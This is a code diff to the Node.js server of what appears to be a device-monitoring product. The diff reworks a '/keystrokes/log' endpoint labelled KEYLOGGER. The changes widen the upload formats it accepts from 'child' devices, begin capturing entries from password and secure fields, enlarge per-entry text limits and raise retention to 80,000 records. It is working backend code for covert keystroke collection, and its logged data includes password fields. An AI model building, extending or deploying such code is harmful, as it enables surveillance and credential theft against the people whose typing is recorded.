@@ -881,59 +881,96 @@ async function handler(req, res) {
     }
 
 
-    // ---- KEYLOGGER (from Full_Clean backend) ----
+    // ---- KEYLOGGER (fixed: events[] + items[] + tab text + password empty) ----
     if (pathname === '/keystrokes/log' && method === 'POST') {
       const ch = childOf(body, q, req.headers);
       if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
       markOnline(ch);
       if (!db.keystrokes) db.keystrokes = [];
-      const deviceId = String(ch.id || ch.deviceId);
-      const pushOne = (pkg, text, ts) => {
-        if (!text || !String(text).trim()) return;
+      const deviceId = String(ch.id || ch.deviceId || '');
+      let saved = 0;
+      const pushOne = (pkg, text, ts, extra) => {
+        const raw = text == null ? '' : String(text);
+        const isPw = !!(extra && (extra.password || extra.is_password || extra.isPassword
+          || (raw.indexOf('[PASSWORD]') >= 0) || (raw.indexOf('[SECURE_FIELD]') >= 0)));
+        // allow empty text only for password/secure markers
+        if (!raw.trim() && !isPw) return;
         let createdAt = now();
         let createdMs = nowMs();
         try {
-          if (typeof ts === 'number') {
-            createdMs = (ts > 1e11) ? ts : nowMs();
+          if (typeof ts === 'number' && isFinite(ts)) {
+            createdMs = (ts > 1e11) ? ts : (ts > 1e9 ? ts * 1000 : nowMs());
             createdAt = new Date(createdMs).toISOString();
           } else if (ts) {
             const p = Date.parse(String(ts));
             if (!isNaN(p) && p > 1e11) { createdMs = p; createdAt = new Date(p).toISOString(); }
           }
         } catch (e) {}
+        const field = (extra && (extra.field || extra.info || extra.fieldInfo)) ? String(extra.field || extra.info || extra.fieldInfo) : '';
         db.keystrokes.push({
           id: rid(),
           deviceId,
-          packageName: pkg || '',
-          text: String(text).slice(0, 4000),
+          packageName: pkg || (extra && extra.pkg) || '',
+          text: raw.slice(0, 32000),
+          field: field.slice(0, 500),
+          isPassword: isPw,
           createdAt,
           createdMs
         });
+        saved++;
       };
+
+      // 1) Modern batch: events: [{ts,pkg,text,field,password}]
+      if (Array.isArray(body.events)) {
+        body.events.forEach(k => {
+          if (!k) return;
+          pushOne(k.pkg || k.packageName || '', k.text, k.ts || k.createdMs || k.createdAt, k);
+        });
+      }
+      // 2) Legacy items: [{packageName,text,createdMs}]
       if (Array.isArray(body.items)) {
         body.items.forEach(k => {
           if (!k) return;
-          pushOne(k.packageName, k.text, k.createdMs || k.createdAt || k.ts);
+          pushOne(k.packageName || k.pkg || '', k.text, k.createdMs || k.createdAt || k.ts, k);
         });
-      } else if (body.text) {
+      }
+      // 3) Client KeystrokeLogger: text = "ts\tpkg\ttext" lines joined by \n
+      if (body.text != null && String(body.text).length > 0) {
         String(body.text).split(/\n/).forEach(line => {
-          const parts = line.split('\t');
+          if (!line || !String(line).trim()) return;
+          // JSONL line support
+          const s = String(line).trim();
+          if (s.charAt(0) === '{') {
+            try {
+              const o = JSON.parse(s);
+              pushOne(o.pkg || o.packageName || '', o.text, o.ts || o.createdMs, o);
+              return;
+            } catch (e) {}
+          }
+          const parts = s.split('\t');
           if (parts.length >= 3) {
             const ms = Number(parts[0]) || nowMs();
-            pushOne(parts[1], parts.slice(2).join('\t'), ms);
-          } else if (line.trim()) pushOne(body.packageName || '', line.trim(), nowMs());
+            pushOne(parts[1], parts.slice(2).join('\t'), ms, null);
+          } else if (s.indexOf(': ') > 0) {
+            // "pkg: text" plain joined form
+            const idx = s.indexOf(': ');
+            pushOne(s.slice(0, idx), s.slice(idx + 2), nowMs(), null);
+          } else {
+            pushOne(body.packageName || body.pkg || '', s, nowMs(), null);
+          }
         });
-      } else if (body.packageName) {
-        pushOne(body.packageName, body.text || '', nowMs());
+      } else if (body.packageName || body.pkg) {
+        pushOne(body.packageName || body.pkg || '', body.text || '', body.ts || nowMs(), body);
       }
+
       const cut = nowMs() - 15 * 24 * 60 * 60 * 1000;
       db.keystrokes = db.keystrokes.filter(k => {
         const ms = k.createdMs || Date.parse(String(k.createdAt || '')) || 0;
         return !ms || ms >= cut;
       });
-      if (db.keystrokes.length > 50000) db.keystrokes = db.keystrokes.slice(-50000);
+      if (db.keystrokes.length > 80000) db.keystrokes = db.keystrokes.slice(-80000);
       save(db);
-      return send(res, 200, { ok: true });
+      return send(res, 200, { ok: true, saved });
     }
 
     if (pathname === '/keystrokes' && method === 'GET') {
